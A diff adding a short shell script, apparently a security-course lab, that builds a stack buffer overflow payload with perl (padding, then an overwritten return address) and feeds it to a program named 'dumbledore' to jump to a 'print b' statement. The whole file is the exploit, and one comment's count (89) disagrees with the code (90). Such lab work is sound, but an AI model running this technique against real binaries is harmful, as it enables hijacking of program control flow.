@@ -1,0 +1,18 @@
+#write name to file
+perl -e 'print "\x52\x6f\x63\x6b \x4b\x69\x6d\0";' > data.txt
+
+#write 89 characters of A to file
+perl -e 'print "\x41"x90;' >> data.txt
+
+#write past i
+perl -e 'print "\x69"' >> data.txt
+
+#save ebp
+#perl -e 'print "\x28\xf3\xff\xbf;"' >> data.txt
+
+#skip to print b statement
+perl -e 'print "\x38\x85\x04\x08;"' >> data.txt
+
+
+
+./dumbledore < data.txt
